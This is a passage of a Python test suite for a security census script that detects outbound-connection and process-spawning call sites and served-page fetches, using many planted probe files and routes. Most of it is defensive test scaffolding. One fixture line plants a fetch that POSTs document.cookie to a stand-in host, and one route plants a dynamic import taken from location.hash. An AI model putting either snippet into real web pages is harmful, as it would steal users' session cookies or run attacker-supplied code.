        at = {name: next(i + 1 for i, ln in enumerate(lines) if ln.startswith(start)) for name, start in ECHO_STARTS}
        self.replace(INVENTORY, ECHO_ARM, ECHO_SKIP)
        rc, out, _ = inventory(scope_copy())
        for name in ("pipe", "substitution", "python", "node", "backtick", "subshell", "quoted", "escaped",
                     "unterminated", "quoted_escape", "bare_escape", "single_quote", "inner_hash"):
            self.assertFalse(_listed(out, "bin/romp:%d  " % at[name]), "%s: under the head's skip the live line is silent (the defect the arm closes)" % name)
        self.assertNotIn("bin/romp:%d" % at["node"], unclassified(out))
        self.assertNotIn("COUNTS per_key bin/romp:", out, "no bin/romp count moves: the run reads as the tree at exit %d" % rc)


class TheConnectionFamilyIsReadThroughItsBindings(_SharedRun):
    """http, https, net, tls and ws are read through the file's bindings as child_process is (the fourth round, extra6-1): an
    inline `require("http").get(`, a destructured `request` renamed to httpRequest and a ws default import's `new WS(` are each
    a site keyed file plus tool (http.get, http.request, WebSocket) with no row, UNCLASSIFIED and no class tag (a connection, not a
    program); a namespace-bound `http.get(` the literal list and the arm both match is counted once (the dedupe the round
    required); and the timeline view's two `require('http').request` calls to the kernel on the loopback, no site before the
    round, sit on their local-kernel row with a committed count of two. The two files are planted in the shared browser run;
    each case's property is a file's own line, so the run's other blocks (appended to strip.ts) cannot satisfy or fail one."""

    RUN = "browser"

    @classmethod
    def mutate(cls, cleanup):
        _plant("ui/webview/probe-bindings.ts", BINDINGS_TEXT, cleanup)
        _plant("ui/webview/probe-dedupe.ts", DEDUPE_TEXT, cleanup)

    def test_the_three_binding_shapes_are_sites_keyed_by_the_familys_tool(self):
        out = self.out
        self.assertRefused(self.rc, out, "UNCLASSIFIED")
        named = unclassified(out)
        for line, tool in ((5, "http.get"), (6, "http.request"), (7, "WebSocket")):
            self.assertIn("ui/webview/probe-bindings.ts:%d" % line, named, tool)
            self.assertListed(out, r"ui/webview/probe-bindings\.ts:%d  %s  .*  in -  -> UNCLASSIFIED$" % (line, re.escape(tool)), "a connection, not a program: no class tag")
            self.assertRefused(self.rc, out, "COUNTS per_key ui/webview/probe-bindings.ts:%s: the committed count is None, this run found 1" % tool)

    def test_a_call_the_literal_list_and_the_arm_both_match_is_one_site(self):
        out = self.out
        self.assertIn("ui/webview/probe-dedupe.ts:4", unclassified(out))
        self.assertEqual(len(_listed(out, "ui/webview/probe-dedupe.ts:4  ")), 1, "the namespace-bound http.get lists once:\n" + "\n".join(_listed(out, "ui/webview/probe-dedupe.ts:")))
        self.assertRefused(self.rc, out, "COUNTS per_key ui/webview/probe-dedupe.ts:http.get: the committed count is None, this run found 1")

    def test_the_dedupe_removed_counts_a_doubly_matched_call_twice(self):
        """M26: the arm's `seen` guard dropped in a scratch copy of the script: the namespace-bound call is emitted by the literal list
        and by the arm, so the planted key counts two and the tree's own namespace-bound keys (the manager's, the extension's) move."""
        self.plant("ui/webview/probe-dedupe.ts", DEDUPE_TEXT)
        self.replace(INVENTORY, "            if tool not in seen: res.emit(rel, i, tool, s[:70], \"-\", T.get(\"%s:%s\" % (rel, tool)), None, kind)\n",
                     "            res.emit(rel, i, tool, s[:70], \"-\", T.get(\"%s:%s\" % (rel, tool)), None, kind)\n")
        rc, out, _ = inventory(scope_copy())
        self.assertEqual(len(_listed(out, "ui/webview/probe-dedupe.ts:4  ")), 2, "without the guard the one call is two sites")
        expected = _expected()
        self.assertRefused(rc, out, "COUNTS per_key ui/webview/probe-dedupe.ts:http.get: the committed count is None, this run found 2",
                           "COUNTS per_key vscode-extension/src/extension.ts:http.get: the committed count is %d, this run found %d"
                           % (expected["per_key"]["vscode-extension/src/extension.ts:http.get"], expected["per_key"]["vscode-extension/src/extension.ts:http.get"] * 2))

    def test_the_timeline_views_two_requests_sit_on_the_local_kernel_row(self):
        rc, out, _ = tree_run()
        self.assertClean(rc, out)
        path = os.path.join(ROOT, "ui", "romp-timeline-view.js")
        lines = [i + 1 for i, ln in enumerate(_lines(path)) if TIMELINE_CALL in ln]
        self.assertEqual(len(lines), 2, "the view's two require('http').request calls, by content: %r" % lines)
        for n in lines:
            self.assertListed(out, r"ui/romp-timeline-view\.js:%d  http\.request  .*  in -  -> local-kernel$" % n, "a site through the inline require, on the row")
        self.assertEqual(len(re.findall(r"^ui/romp-timeline-view\.js:\d+  http\.request  ", out, re.M)), 2)
        self.assertEqual(_expected()["per_key"]["ui/romp-timeline-view.js:http.request"], 2, "the row's committed count")

    def test_the_arm_removed_leaves_the_bindings_silent_and_the_row_stale(self):
        """M20: the arm's loop emptied in a scratch copy of the script: the three planted lines are no site, and the timeline row
        names none, so the run refuses its stale row and the count."""
        self.plant("ui/webview/probe-bindings.ts", BINDINGS_TEXT)
        self.replace(INVENTORY, ARM_LINE, ARM_OFF)
        rc, out, _ = inventory(scope_copy())
        for line in (5, 6, 7):
            self.assertNotIn("ui/webview/probe-bindings.ts:%d" % line, unclassified(out))
            self.assertFalse(_listed(out, "ui/webview/probe-bindings.ts:%d  " % line), "without the arm the binding shape is silent (the defect)")
        self.assertRefused(rc, out, "STALE ROW ui/romp-timeline-view.js:http.request names no site",
                           "COUNTS per_key ui/romp-timeline-view.js:http.request: the committed count is 2, this run found None")


def _import_lines(out, rel):
    """The IMPORT lines of a run that name a place in one file (`IMPORT <rel>:<line> ...`)."""
    return [ln for ln in out.splitlines() if ln.startswith("IMPORT %s:" % rel)]


def _refusal(rel, line, how):
    """The sixth round's IMPORT line for a place: how is ("names", the module, the specifier as spelled) for a family module's
    specifier no counted binding reads, or ("spells", the clause, the expression) for a require or import the gate cannot read."""
    kind, a, b = how
    return (_SPEC_REFUSED if kind == "names" else _REQ_REFUSED) % (rel, line, a, b)


class TheAddedBindingShapesAreRead(_SharedRun):
    """The fifth round of the review (correctness-3): _binding_patterns gained the mixed default-plus-named import (the default a
    space, the brace list names), the default-plus-namespace import (both spaces), `import { default as X }` (X a space), TypeScript's
    `import X = require()` and a bound `await import()` whole (a space) and destructured (names), each alternative one line of the
    script; the shapes reach child_process through the same patterns. probe-binding-shapes.ts, planted in the shared browser run,
    calls through each shape once over http, ws and child_process, and every call line is a site keyed by the family's tool with no
    row, and no IMPORT line names the file (each specifier is read by the binding it makes). probe-unread-bindings.ts plants the
    three shapes no pattern reads (a require assigned after its declaration, a `.then()` callback parameter, an aliased require)
    over the same three modules, and probe-unread-https.ts the same three over https: until the sixth round the residual's witness
    at no site, and since the sixth round's review (correctness-4, extra6-1, extra7-2; the ruling moved these plants from held at
    no site to red at their refusal lines) each line that spells a refused shape is an IMPORT line by name, the late-assigned
    require and the `.then()` import by the specifier refusal and the aliased require's bare `require` by the require refusal,
    while no line is a site; over https the gate's own IMPORT lines stand beside them. probe-unread-aliases.ts holds what a binding
    the patterns read still leaves unread (extra6-3, planted at its outcome as the fifth round's I planted the residual): a member
    alias and a destructure from a namespace binding are no site and no line, and an https namespace's member alias fails the run
    at the gate alone, which reads that import's own line (UNREAD_BINDINGS, the docstring's text, held here). Since the seventh
    round's review the same file holds the calls UNREAD_BINDINGS names as not read, each no site and no line: a call spelled with
    whitespace or a comment around the dot or before the paren, on a namespace and on a bare name, and a call split across lines
    before its paren, after the name or after the dot, over http and child_process. No scan
    is added: each alternative's line removed from a scratch copy of the script silences that arm's lines and no other, a red the
    fifth round's record carries (M40 to M46) and not a case of its own, since each such case would be a full scan; the sixth
    round's arms are recorded the same way. Every property is a line of these files, so the run's other members (appended to
    strip.ts, or files of their own) cannot satisfy or fail one."""

    RUN = "browser"
    SHAPES, UNREAD, HTTPS = "ui/webview/probe-binding-shapes.ts", "ui/webview/probe-unread-bindings.ts", "ui/webview/probe-unread-https.ts"
    ALIASES = "ui/webview/probe-unread-aliases.ts"
    SPLIT = "ui/webview/probe-split-imports.ts"

    @classmethod
    def mutate(cls, cleanup):
        _plant(cls.SHAPES, SHAPES_TEXT, cleanup)
        _plant(cls.UNREAD, UNREAD_TEXT, cleanup)
        _plant(cls.HTTPS, UNREAD_HTTPS, cleanup)
        _plant(cls.ALIASES, ALIASES_TEXT, cleanup)
        _plant(cls.SPLIT, SPLIT_TEXT, cleanup)

    def test_a_split_statement_is_gated_at_its_continuing_line_and_the_other_split_specifiers_are_no_gate_line(self):
        """Since the sixth round the import gate reads the `from` string on a line that continues an import or export statement
        that begins its own line (in a walked file, since the seventh round's review, on any line of the statement whatever leads
        it), and, in a walked file, any line led by a closing brace; there a statement opens only at `import`, `export {`, `export
        *`, `export type {` or `export type *` (UNREAD_BINDINGS states
        these reads, and the webview leg's pin, ui/webview/import-gate-parse.test.ts, holds them equal to a TypeScript parse over
        the walked files of the tree). probe-split-imports.ts (SPLIT_TEXT): over https the gate's line at the `from` line after a
        namespace clause (2) and at a brace list's closing line (5, read at the sixth round's head too), and over a package no
        binding pattern names at its `from` line (9) and at a name-led continuation line (22, the tree's own layout for a long
        import); no gate line at a specifier on the line after a trailing `from` (7) or at a split require's specifier (11), two
        layouts the line reader does not read and the tree does not hold (the pin would be red on either in a walked file of the
        tree); the split require's paren line is the second refusal's (10); a binding on a line led by `//`, `/*` or `*`, which the
        line reader skips, is the first refusal's line by name (a binding on a line led by //, /* or *, whose module the gate does
        not read), whatever the line is: a comment's line (14), which the pin's parse does not see either, a multi-line import's
        `* as hs6` continuation (27), a line of code whose specifier the pin's parse reads (so in a walked file of the tree the pin
        is red on it too), and a `//`-led line inside a template literal (29), string text the pin's parse does not read; and no
        gate line at a `from` string in a string literal after an `export function` line (24), which opens no statement. At the
        sixth round's head only 5 is a line; at the seventh round's head 2, 5 and 9, and 22, 14, 27 and 29 are none. The
        statement state and its
        completion here widen the gate's reads in walked files, a departure from the sixth round's ruling of no widening that
        the seventh round's review accepted, since reading more is the safe side; served text keeps its reads.
        The arms whose removal reds each: the continuation state for 2 and 9 (2's `from` line is read by nothing else); the read
        of any line of an open statement, whatever leads it, for 22; the statement's narrower opening in a walked file for 24
        (`export function` then opening one, the string's `from "probe-split-over"` is read); and the refusal of a binding on a
        line led by `//`, `/*` or `*` for 14, 27 and 29 (no line again)."""
        out = self.out
        for line, pkg in SPLIT_GATED.items():
            self.assertRefused(self.rc, out, "IMPORT %s:%d imports %s, a package the census does not know" % (self.SPLIT, line, pkg))
        self.assertRefused(self.rc, out, _refusal(self.SPLIT, SPLIT_PAREN, ("spells", "a call of require in a shape the gate does not read", "require(")))
        for line, expr in ((SPLIT_COMMENT, 'const hs5 = require("https")'), (SPLIT_LED[0], '* as hs6 from "https"'), (SPLIT_LED[1], 'const hs7 = require("https")')):
            with self.subTest(plant="a binding on a line led by //, /* or *", line=line):
                self.assertRefused(self.rc, out, "IMPORT %s:%d names https in %s, a binding on a line led by //, /* or *, whose module the gate "
                                   "does not read: bind the module on a line the gate reads, or name the place in JS_ALLOW with its reason" % (self.SPLIT, line, expr))
        for line in SPLIT_UNGATED:
            self.assertNotIn("IMPORT %s:%d " % (self.SPLIT, line), out, "a binding's specifier the line reader does not read is no gate line "
                             "(the webview leg's pin holds the tree's walked files to a TypeScript parse)")
        self.assertNotIn("IMPORT %s:%d " % (self.SPLIT, SPLIT_NOT_OPENED), out, "an `export function` line opens no statement in a walked "
                         "file, so a `from` string in a string literal on the next line is no gate line")
        self.assertEqual(sorted(int(ln.split(" ", 2)[1].rsplit(":", 1)[1]) for ln in _import_lines(out, self.SPLIT)),
                         sorted(list(SPLIT_GATED) + [SPLIT_PAREN, SPLIT_COMMENT] + list(SPLIT_LED)),
                         "the gate's line at each continuing line, the refusal at the split require's paren and at each binding on a "
                         "line led by //, /* or *, and no other:\n"
                         + "\n".join(_import_lines(out, self.SPLIT)))
        self.assertFalse(_listed(out, self.SPLIT + ":"), "every client is reached through a member alias: no line of the file is a site")

    def test_each_added_shape_is_a_site_keyed_by_the_familys_tool(self):
        out = self.out
        self.assertRefused(self.rc, out, "UNCLASSIFIED")
        named = unclassified(out)
        for shape, (line, tool) in SHAPE_LINES.items():
            self.assertIn("%s:%d" % (self.SHAPES, line), named, shape)
            self.assertListed(out, r"%s:%d  %s  .*  in -  -> UNCLASSIFIED$" % (re.escape(self.SHAPES), line, re.escape(tool)), shape)
        for tool, n in SHAPE_COUNTS.items():
            self.assertRefused(self.rc, out, "COUNTS per_key %s:%s: the committed count is None, this run found %d" % (self.SHAPES, tool, n))
        self.assertEqual(sorted(int(ln.split("  ")[0].rsplit(":", 1)[1]) for ln in _listed(out, self.SHAPES + ":")),
                         sorted(line for line, _ in SHAPE_LINES.values()), "the call lines and no other line of the file")
        self.assertEqual(_import_lines(out, self.SHAPES), [], "every specifier of the file is read by the binding it makes: no refusal")

    def test_the_fifth_rounds_unread_shapes_are_refused_at_their_lines_and_no_line_is_a_site(self):
        out = self.out
        self.assertIn(UNREAD_BINDINGS, _inventory_docstring(), "the docstring states the refusals this file holds")
        self.assertFalse(_listed(out, self.UNREAD + ":"), "no pattern reads these shapes, so no line is a site")
        self.assertFalse([t for t in unclassified(out) if t.startswith(self.UNREAD + ":")])
        for line, how in UNREAD_REFUSED:
            self.assertRefused(self.rc, out, _refusal(self.UNREAD, line, how))
        self.assertEqual(sorted(int(ln.split(" ", 2)[1].rsplit(":", 1)[1]) for ln in _import_lines(out, self.UNREAD)),
                         sorted(line for line, _ in UNREAD_REFUSED),
                         "one IMPORT line per refused shape and none on the call lines (http, ws and child_process are known packages):\n"
                         + "\n".join(_import_lines(out, self.UNREAD)))

    def test_over_https_the_gate_and_the_refusals_read_the_literal_shapes_and_the_aliased_require_is_refused(self):
        out = self.out
        self.assertRefused(self.rc, out, "IMPORT %s:2 imports https" % self.HTTPS, "IMPORT %s:4 imports https" % self.HTTPS)
        for line, how in UNREAD_HTTPS_REFUSED:
            self.assertRefused(self.rc, out, _refusal(self.HTTPS, line, how))
        self.assertNotIn("IMPORT %s:5 imports" % self.HTTPS, out, "an aliased require spells no literal require(): the gate does not read it, "
                         "and the bare `require` it takes is refused instead")
        self.assertEqual(len(_import_lines(out, self.HTTPS)), 5, "the gate's two lines and the three refusals:\n" + "\n".join(_import_lines(out, self.HTTPS)))
        self.assertFalse(_listed(out, self.HTTPS + ":"), "no line of the file is a site")

    def test_a_member_alias_and_a_destructure_from_a_read_binding_are_no_site_and_https_fails_at_the_gate(self):
        out = self.out
        self.assertIn("a member alias (`const g = http.get`), a destructure from the binding (`const { get } = http`)", _inventory_docstring(),
                      "the docstring names the two shapes this file holds (its sentence is UNREAD_BINDINGS)")
        self.assertIn("a call spelled with whitespace or a comment around the dot or before the paren (`http . get(`, `http.get (`, `get (`) "
                      "and a call split across lines before its paren", _inventory_docstring(),
                      "the docstring names the calls this file holds as not read (its sentence is UNREAD_BINDINGS)")
        self.assertFalse(_listed(out, self.ALIASES + ":"), "a client reached from a read binding other than by a call the patterns read (a "
                         "member alias, a destructure, a call spelled with a gap around the dot or before the paren, a call split across "
                         "lines before its paren) is no site")
        self.assertEqual(_import_lines(out, self.ALIASES), ["IMPORT %s:2 imports https, a package the census does not know: a client that opens "
                                                            "connections or starts programs takes its primitives into JS or the child_process family; "
                                                            "either way add it to KNOWN_JS_IMPORTS with the reason" % self.ALIASES],
                         "no line for the http aliases (the residual), and over https the gate's line at the specifier the binding came from")


class TheJavaScriptSideRefusesWhatItCannotRead(_SharedRun):
    """The sixth round of the review (correctness-4, extra6-1, extra7-2), ruled under the reviewer's rule on instruments' limits (a
    loud refusal, not a widening): two refusals on the JavaScript side, each an IMPORT line by file and line unless JS_ALLOW names the
    place by its file and expression. A family module's specifier the import gate reads (http, https, net, tls, ws, child_process)
    is read only where a counted binding takes the module from it or an arm reads a call through it (_specifier_read; a whole
    binding followed by `.`, `?`, `[` or `(` does not count, nor does a brace list taking `default` that no whole binding of the
    same statement reads), and on a walked line a require or import the gate cannot read is refused (_js_unread_requires).
    probe-refused-specifiers.ts plants the four shapes ruling 1 names (a require in a later declarator, `require("http").get`
    read as a value, a destructured default of `await import()`, a `.then()` import), the named and the namespace re-export, a
    default beside a brace list that takes `default` (the counted default and the uncounted brace list end at one place, which is
    then not read), and the two over-reds the text discloses (`import type`, `typeof import()`), and probe-unread-requires.ts the
    spellings ruling 2 names (`require (`, a template specifier, a comment before the paren, `module.require`,
    `process.mainModule.require`, createRequire, a member access on require, an aliased require, and import( with a gap or a
    template); each is silent at the sixth round's head and one IMPORT line here, and no line of either file is a site. One line of
    the second file is held at no line: `require` inside a string and at the end of a trailing comment, which the bare-value clause
    does not read (_js_code). The allowlist's four live places (the manager's `require.main` guard, the
    timeline view's agent, the test helper's createRequire and its regex literal) are held on the tree's one derivation by their
    recorded places, and its two gates in this run: the manager's guard respelled in the copy leaves its entry naming nothing, and
    a second agent appended to the timeline view is a second place under that entry's key, each an IMPORT ALLOW line by key. Each
    refusal's arm removed from a scratch copy of the script silences its plants and no other (the round's record), not a case of
    its own, since each would be a full scan; the plants ride the shared browser run and add none. Every property is a line of
    these files or a line naming a key, so the run's other members cannot satisfy or fail one."""

    RUN = "browser"
    SPECS, REQUIRES = "ui/webview/probe-refused-specifiers.ts", "ui/webview/probe-unread-requires.ts"

    @classmethod
    def mutate(cls, cleanup):
        _plant(cls.SPECS, REFUSED_SPECIFIERS_TEXT, cleanup)
        _plant(cls.REQUIRES, UNREAD_REQUIRES_TEXT, cleanup)
        _replace("bin/romp-manager", MANAGER_GUARD, MANAGER_GUARD_GONE, cleanup)
        _append("ui/romp-timeline-view.js", TIMELINE_SECOND_AGENT, cleanup)

    def test_a_family_specifier_no_counted_binding_reads_is_refused_at_its_line(self):
        out = self.out
        for shape, line, mod, form in REFUSED_SPECIFIER_LINES:
            self.assertRefused(self.rc, out, _refusal(self.SPECS, line, ("names", mod, form)))
        self.assertEqual(sorted(int(ln.split(" ", 2)[1].rsplit(":", 1)[1]) for ln in _import_lines(out, self.SPECS)),
                         sorted(line for _s, line, _m, _f in REFUSED_SPECIFIER_LINES),
                         "one IMPORT line per planted shape and none on the call lines:\n" + "\n".join(_import_lines(out, self.SPECS)))
        self.assertFalse(_listed(out, self.SPECS + ":"), "no binding the patterns count is made, so no call line is a site")

    def test_a_require_or_import_the_gate_cannot_read_is_refused_at_its_line(self):
        out = self.out
        for spelling, line, what, expr in UNREAD_REQUIRE_LINES:
            self.assertRefused(self.rc, out, _refusal(self.REQUIRES, line, ("spells", what, expr)))
        self.assertEqual(sorted(int(ln.split(" ", 2)[1].rsplit(":", 1)[1]) for ln in _import_lines(out, self.REQUIRES)),
                         sorted(line for _s, line, _w, _e in UNREAD_REQUIRE_LINES),
                         "one IMPORT line per planted spelling:\n" + "\n".join(_import_lines(out, self.REQUIRES)))
        self.assertFalse(_listed(out, self.REQUIRES + ":"), "no line of the file is a site")

    def test_the_allowlist_places_the_four_live_lines_by_file_and_expression(self):
        rc, out, _ = tree_run()
        self.assertClean(rc, out)
        self.assertFalse([ln for ln in out.splitlines() if ln.startswith("IMPORT")], "the tree's run has no IMPORT line")
        allow, res = getattr(script_module(ROOT), "JS_ALLOW", {}), _tree().res
        self.assertEqual(set(allow), set(JS_ALLOW_PLACES), "the one JavaScript allowlist holds the four live places and no other")
        for key, locator in sorted(JS_ALLOW_PLACES.items()):
            count, reason = allow[key]
            self.assertTrue(reason.strip(), "every entry carries its reason: %r" % (key,))
            lines = [i + 1 for i, ln in enumerate(_lines(os.path.join(ROOT, key[0]))) if locator in ln]
            self.assertEqual(len(lines), 1, "%r is located by content on one line of %s: %r" % (locator, key[0], lines))
            self.assertEqual(count, 1, "each entry covers its one live place: %r" % (key,))
            self.assertEqual(sorted(line for line, _col in res.allow_hits.get(key, ())), lines,
                             "the tree's run records the entry's one place at the located line: %r" % (key,))
        # a source pin, not the proof: the executed proof of the createRequire refusal is the plant above (line 7 of
        # probe-unread-requires.ts) and the allowlist's place for the helper's call
        self.assertIn(MODULE_REASON, _script_comments(ROOT), "KNOWN_JS_IMPORTS's reason for `module` says its createRequire is refused by name")

    def test_an_entry_naming_nothing_and_a_second_place_under_a_key_fail_the_run(self):
        out = self.out
        self.assertRefused(self.rc, out, "IMPORT ALLOW bin/romp-manager 'require.main' names nothing this run reads: drop it from JS_ALLOW (an "
                           "entry for code that is gone is never a pass)",
                           "IMPORT ALLOW ui/romp-timeline-view.js \"require('http')\" covers 2 places, the entry says 1: a new place under an "
                           "entry's key is read or named, never excused by the key")
        self.assertFalse(_import_lines(out, "ui/romp-timeline-view.js"), "the second agent is excused by the key and counted against it, not listed")

    def test_the_ledger_entrys_census_paragraph_carries_the_text(self):
        """The entry's census paragraph is the third home of UNREAD_BINDINGS (the docstring's is held by TheResidualClassIsStatedAndHeld
        and SECURITY.md's by tests/test_security_price_feed.py): one text, right after the disclosure sentence it qualifies."""
        with open(os.path.join(ROOT, LEDGER), encoding="utf-8") as f:
            text = f.read()
        paragraphs = [" ".join(p.split()) for p in text.split("\n\n") if DISCLOSURE[1:] in " ".join(p.split())]
        self.assertEqual(len(paragraphs), 1, "one paragraph of %s carries the disclosure sentence" % LEDGER)
        self.assertIn(DISCLOSURE[1:] + " " + UNREAD_BINDINGS, paragraphs[0], "the census paragraph carries the text right after the disclosure")


def _script_comments(root):
    """The script's full-line comments, their `#` leads dropped and their wraps folded to single spaces, so a comment's sentence is
    matched whole."""
    with open(os.path.join(root, INVENTORY), encoding="utf-8") as f:
        return " ".join(" ".join(ln.strip()[1:].strip() for ln in f if ln.strip().startswith("#")).split())


# F, G and H of the fifth round, planted in the same served pass: a route's content type (F), the receivers and containers a
# page's text is read through (G) and how served text is read per line (H). Every plant but three is a do_GET branch landed
# before the /chat branch (FGH_ROUTES) with what it reads appended at the module's end (FGH_DEFS) or bound in Handler's body
# (FGH_HANDLER); H1 and H2 are parts of the drift banner's joined constants, and F11 respells the one place an allowlist entry
# covers. A plant's page is one fetch naming the plant by its tag (FGH_PAGE), located by the URL with its closing quote
# (_fgh_mark), so f1 never matches f10.
FGH_PAGE = "<script>fetch('https://example.invalid/%s')</script>"


def _fgh_route(tag, *body):
    """A do_GET branch serving /probe-<tag> with the given body lines, in the shape ROUTE_PLANTS lands before the /chat branch."""
    return '            if p == "/probe-%s":\n' % tag + "".join("                %s\n" % ln for ln in body)


def _fgh_mark(tag):
    """The text that locates a plant page's fetch by content: its URL with the closing quote."""
    return "https://example.invalid/%s'" % tag


FGH_ROUTES = "".join((
    _fgh_route("f1", 'return self._send(200, "%s", _PROBE_F1_CT)' % (FGH_PAGE % "f1")),
    _fgh_route("f2", 'return self._send(200, "%s", ctype="text/html")' % (FGH_PAGE % "f2")),
    _fgh_route("f3", 'return self._send(200, "%s", "Text/HTML; Charset=UTF-8")' % (FGH_PAGE % "f3")),
    _fgh_route("f4", 'return self._send(200, "<svg xmlns=\'http://www.w3.org/2000/svg\'>%s</svg>", "image/svg+xml")' % (FGH_PAGE % "f4")),
    _fgh_route("f5", 'return self._send(200, "<html xmlns=\'http://www.w3.org/1999/xhtml\'>%s</html>", "application/xhtml+xml")' % (FGH_PAGE % "f5")),
    _fgh_route("f6", 'return self._send(200, "fetch(\'https://example.invalid/f6\');", "application/javascript")'),
    _fgh_route("f7", 'self.send_response(200)', 'self.send_header("Content-Type", "text/html")', 'self.end_headers()',
               'self.wfile.write(b"%s")' % (FGH_PAGE % "f7"), 'return'),
    _fgh_route("f8", '_pct8 = "text/html"', 'return self._send(200, "%s", _pct8)' % (FGH_PAGE % "f8")),
    _fgh_route("f9", 'return self._send(200, open("/nonexistent").read(), _PROBE_F9_CT)'),
    _fgh_route("f10", 'return self._send(200, "%s", _probe_f10_type())' % (FGH_PAGE % "f10")),
    _fgh_route("f12", 'ct = "text/html"', 'return self._send(200, "%s", ct + "; charset=utf-8")' % (FGH_PAGE % "f12")),
    _fgh_route("g1", 'return self._send(200, _probe_g1().encode("utf-8"), "text/html")'),
    _fgh_route("g1b", 'return self._send(200, _PROBE_G1B.encode("utf-8"), "text/html")'),
    _fgh_route("g2", 'return self._send(200, _PROBE_G2S.get(p, "<p>none</p>"), "text/html")'),
    _fgh_route("g3", 'return self._send(200, _PROBE_G3S["/probe-g3"] + "\\n", "text/html")'),
    _fgh_route("g4", 'return self._send(200, _PROBE_G4.format_map({"a": "b"}), "text/html")'),
    _fgh_route("g4b", 'return self._send(200, _probe_g4b().format_map({"a": "b"}), "text/html")'),
    _fgh_route("g5", 'return self._send(200, "<html>" + self._PROBE_G5, "text/html")'),
    _fgh_route("g6", 'return self._send(200, "<html>" + _PROBE_G6S["x"], "text/html")'),
    _fgh_route("g7", 'return self._send(200, _probe_g7().get("x", "<p>none</p>"), "text/html")'),
    _fgh_route("g8", 'return self._send(200, "<p>" + _PROBE_G8_MEMO["k"], "text/html")'),
    _fgh_route("g9", 'return self._send(200, _PROBE_G9S.get("x", "").strip().encode("utf-8"), "text/html")'),
    _fgh_route("g10", 'return self._send(200, _probe_g10().get("x", "").encode("utf-8"), "text/html")'),
    _fgh_route("g11", 'return self._send(200, self._probe_g11().get("x", ""), "text/html")'),
    _fgh_route("g15", 'return self._send(200, _probe_g15a() + _probe_g15b(), "text/html")'),
    _fgh_route("h4", 'return self._send(200, "<script>import(\'/dist/probe.js\');import(location.hash.slice(1))</script>", "text/html")'),
    _fgh_route("h5", 'return self._send(200, f"""<html>', '<p>{p}</p>%s' % (FGH_PAGE % "h5"), '</html>""", "text/html")'),
    _fgh_route("h6", 'return self._send(200, f"""{p}', FGH_PAGE % "h6", '{p}', FGH_PAGE % "h6", '{p}""", "text/html")'),
    _fgh_route("h7", 'return self._send(200, "%s" + p + "%s", "text/html")' % (FGH_PAGE % "h7", FGH_PAGE % "h7")),
    _fgh_route("r1", 'return self._send(200, f"""<p>{p', '}%s</p>""", "text/html")' % (FGH_PAGE % "r1")),
    _fgh_route("r2", 'return self._send(200, ("<a>"', ' f"<b>{p}"', ' "%s"), "text/html")' % (FGH_PAGE % "r2")),
    _fgh_route("r3", 'return self._send(200, (f"<p>{p}</p>"', ' f"%s"), "text/html")' % (FGH_PAGE % "r3"))))
FGH_DEFS = "\n\n" + "\n\n\n".join((
    '_PROBE_F1_CT = "text/html; charset=utf-8"',
    '_PROBE_F9_CT = "text/html"',
    'def _probe_f10_type():\n    return "text/html"',
    'def _probe_g1():\n    return "%s"' % (FGH_PAGE % "g1"),
    '_PROBE_G1B = "%s"' % (FGH_PAGE % "g1b"),
    '_PROBE_G2S = {"/probe-g2": "%s"}' % (FGH_PAGE % "g2"),
    '_PROBE_G3S = {"/probe-g3": "%s"}' % (FGH_PAGE % "g3"),
    '_PROBE_G4 = "%s{a}"' % (FGH_PAGE % "g4"),
    'def _probe_g4b():\n    return "%s{a}"' % (FGH_PAGE % "g4b"),
    '_PROBE_G6S = {"x": "%s", "n": 3}' % (FGH_PAGE % "g6"),
    'def _probe_g7():\n    return {"x": "%s"}' % (FGH_PAGE % "g7"),
    '_PROBE_G8_MEMO = {}\n\n\ndef _probe_g8_fill(t):\n    _PROBE_G8_MEMO["k"] = t',
    '_PROBE_G9S = {"x": "%s"}' % (FGH_PAGE % "g9"),
    'def _probe_g10():\n    return {"x": "%s"}' % (FGH_PAGE % "g10"),
    'def _probe_g15a():\n    body = "<p>a</p>"\n    return body\n\n\ndef _probe_g15b():\n    body = "%s"\n    return body' % (FGH_PAGE % "g15"))) + "\n"
FGH_HANDLER = '    _PROBE_G5 = "%s"\n\n    def _probe_g11(self):\n        return {"x": "%s"}\n\n' % (FGH_PAGE % "g5", FGH_PAGE % "g11")
DRIFT_JS_ANCHOR = "    \"dm.onclick=function(){dismissed=key(stale);phase='idle';box.classList.remove('show');};\"\n"
H1_PLANT = "    \"fetch('https://example.invalid/h1',{method:'POST',body:document.cookie});\"\n"   # after the constant's local fetches
DRIFT_CSS_ANCHOR = "_RDRIFT_CSS = (\n"
H2_PLANT = '    "*{box-sizing:border-box}</style>%s<style>"\n' % (FGH_PAGE % "h2")   # the joined constant's first part, led by *{
# F11: the one place the _file_slice entry covers, its type argument, spelled as the literal of one of _slice_body's two types
SLICE_SEND = 'payload if isinstance(payload, str) else json.dumps(payload), ctype, cache="no-cache")'
SLICE_LITERAL = 'payload if isinstance(payload, str) else json.dumps(payload), "application/json", cache="no-cache")'
SLICE_KEY = ("kernel/kernel.py:Handler._file_slice", "ctype")   # the entry F11 leaves naming nothing
DIST_KEY = ("kernel/kernel.py:Handler.do_GET", "ct + '; charset=utf-8'")   # the /dist and /media entry F12 adds a place under
DIST_PLACES = 2   # the places the /dist and /media entry covers at the head, the branch's two _send calls
# the plants whose page's fetch lists UNCLASSIFIED at its own line (the plant, its tag), and the plants refused by name (the
# plant, its tag, the SERVED line with the tag's line in place of %d), each tag's line located by content (FGH_PLANT_LINES)
FGH_TYPED = (("F1 a type a module constant names", "f1"), ("F2 a type passed as ctype=", "f2"),
             ("F3 a type in mixed case with a parameter", "f3"), ("F4 image/svg+xml", "f4"), ("F5 application/xhtml+xml", "f5"),
             ("F6 application/javascript", "f6"), ("F8 a type a local binds", "f8"))
FGH_TYPE_REFUSED = (("F7 a Content-Type written outside _send", "f7",
                     "SERVED kernel/kernel.py:%d writes Content-Type text/html outside _send (Handler.do_GET)"),
                    ("F9 an unreadable body under a module constant's type", "f9",
                     "SERVED kernel/kernel.py:%d reads /nonexistent for a served page, a file the walk does not scan"),
                    ("F10 a type a function returns", "f10",
                     "SERVED kernel/kernel.py:%d serves a response whose content type the census cannot resolve (_probe_f10_type() in Handler.do_GET)"))
FGH_READ = (("G1 .encode on a function's return", "g1"), ("G1b .encode on a module constant", "g1b"),
            ("G2 .get with a default on a module dict", "g2"), ("G3 a module dict's subscript joined with a literal", "g3"),
            ("G4 .format_map on a module constant", "g4"), ("G4b .format_map on a function's return", "g4b"),
            ("G5 a class attribute", "g5"), ("G6 a subscript of a module dict with a value of another type", "g6"),
